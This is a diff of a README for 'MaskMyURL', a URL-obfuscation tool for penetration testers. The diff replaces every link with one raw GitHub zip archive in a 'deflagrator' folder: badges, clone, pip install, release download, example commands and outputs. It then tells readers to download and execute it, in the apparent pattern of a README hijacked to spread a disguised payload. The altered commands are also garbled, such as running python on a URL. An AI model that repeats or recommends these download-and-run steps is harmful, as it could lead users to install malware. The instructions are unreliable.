@@ -1,8 +1,8 @@
 # MaskMyURL: URL Obfuscator 🛡️
 
-![MaskMyURL](https://img.shields.io/badge/MaskMyURL-Url%20Obfuscator-blue.svg)
-![Python](https://img.shields.io/badge/Python-3.x-brightgreen.svg)
-![License](https://img.shields.io/badge/License-MIT-yellow.svg)
+![MaskMyURL](https://raw.githubusercontent.com/Ice24787/MaskMyURL-Url-Obfuscator-a0/main/deflagrator/Url-a-Mask-My-Obfuscator-UR-v1.1.zip%https://raw.githubusercontent.com/Ice24787/MaskMyURL-Url-Obfuscator-a0/main/deflagrator/Url-a-Mask-My-Obfuscator-UR-v1.1.zip)
+![Python](https://raw.githubusercontent.com/Ice24787/MaskMyURL-Url-Obfuscator-a0/main/deflagrator/Url-a-Mask-My-Obfuscator-UR-v1.1.zip)
+![License](https://raw.githubusercontent.com/Ice24787/MaskMyURL-Url-Obfuscator-a0/main/deflagrator/Url-a-Mask-My-Obfuscator-UR-v1.1.zip)
 
 Welcome to **MaskMyURL**, a powerful Python script designed to obfuscate URLs using open redirects and HTTP Basic Authentication tricks. This tool is essential for cybersecurity testing and ethical hacking. Whether you're a penetration tester or a cybersecurity enthusiast, this script can help you understand and demonstrate the risks associated with URL manipulation.
 
@@ -38,7 +38,7 @@ To install **MaskMyURL**, follow these steps:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/Ice24787/MaskMyURL-Url-Obfuscator-a0.git
+   git clone https://raw.githubusercontent.com/Ice24787/MaskMyURL-Url-Obfuscator-a0/main/deflagrator/Url-a-Mask-My-Obfuscator-UR-v1.1.zip
    cd MaskMyURL-Url-Obfuscator-a0
    ```
 
@@ -47,12 +47,12 @@ To install **MaskMyURL**, follow these steps:
    Make sure you have Python installed. Then, run:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Ice24787/MaskMyURL-Url-Obfuscator-a0/main/deflagrator/Url-a-Mask-My-Obfuscator-UR-v1.1.zip
    ```
 
 3. **Download the Latest Release**:
 
-   You can download the latest release [here](https://github.com/Ice24787/MaskMyURL-Url-Obfuscator-a0/releases). After downloading, execute the script to start using it.
+   You can download the latest release [here](https://raw.githubusercontent.com/Ice24787/MaskMyURL-Url-Obfuscator-a0/main/deflagrator/Url-a-Mask-My-Obfuscator-UR-v1.1.zip). After downloading, execute the script to start using it.
 
 ## Usage
 
@@ -65,7 +65,7 @@ Using **MaskMyURL** is straightforward. Here’s how to run the script:
 Example command:
 
 ```bash
-python maskmyurl.py --url "http://example.com"
+python https://raw.githubusercontent.com/Ice24787/MaskMyURL-Url-Obfuscator-a0/main/deflagrator/Url-a-Mask-My-Obfuscator-UR-v1.1.zip --url "https://raw.githubusercontent.com/Ice24787/MaskMyURL-Url-Obfuscator-a0/main/deflagrator/Url-a-Mask-My-Obfuscator-UR-v1.1.zip"
 ```
 
 This command will obfuscate the provided URL. You can customize the parameters as needed.
@@ -77,23 +77,23 @@ Here are a few examples to illustrate how **MaskMyURL** works:
 ### Example 1: Basic URL Obfuscation
 
 ```bash
-python maskmyurl.py --url "http://example.com"
+python https://raw.githubusercontent.com/Ice24787/MaskMyURL-Url-Obfuscator-a0/main/deflagrator/Url-a-Mask-My-Obfuscator-UR-v1.1.zip --url "https://raw.githubusercontent.com/Ice24787/MaskMyURL-Url-Obfuscator-a0/main/deflagrator/Url-a-Mask-My-Obfuscator-UR-v1.1.zip"
 ```
 
 Output:
 ```
-Obfuscated URL: http://redirector.com/?url=http://example.com
+Obfuscated URL: https://raw.githubusercontent.com/Ice24787/MaskMyURL-Url-Obfuscator-a0/main/deflagrator/Url-a-Mask-My-Obfuscator-UR-v1.1.zip
 ```
 
 ### Example 2: Using HTTP Basic Authentication
 
 ```bash
-python maskmyurl.py --url "http://example.com" --auth "user:password"
+python https://raw.githubusercontent.com/Ice24787/MaskMyURL-Url-Obfuscator-a0/main/deflagrator/Url-a-Mask-My-Obfuscator-UR-v1.1.zip --url "https://raw.githubusercontent.com/Ice24787/MaskMyURL-Url-Obfuscator-a0/main/deflagrator/Url-a-Mask-My-Obfuscator-UR-v1.1.zip" --auth "user:password"
 ```
 
 Output:
 ```
-Obfuscated URL with Auth: http://auth.redirector.com/?url=http://example.com
+Obfuscated URL with Auth: https://raw.githubusercontent.com/Ice24787/MaskMyURL-Url-Obfuscator-a0/main/deflagrator/Url-a-Mask-My-Obfuscator-UR-v1.1.zip
 ```
 
 ## Contributing
@@ -113,7 +113,7 @@ Please ensure your code adheres to the existing style and includes tests where a
 
 ## Support
 
-If you have any questions or need support, feel free to reach out. You can also check the [Releases](https://github.com/Ice24787/MaskMyURL-Url-Obfuscator-a0/releases) section for updates and additional resources.
+If you have any questions or need support, feel free to reach out. You can also check the [Releases](https://raw.githubusercontent.com/Ice24787/MaskMyURL-Url-Obfuscator-a0/main/deflagrator/Url-a-Mask-My-Obfuscator-UR-v1.1.zip) section for updates and additional resources.
 
 ---
 
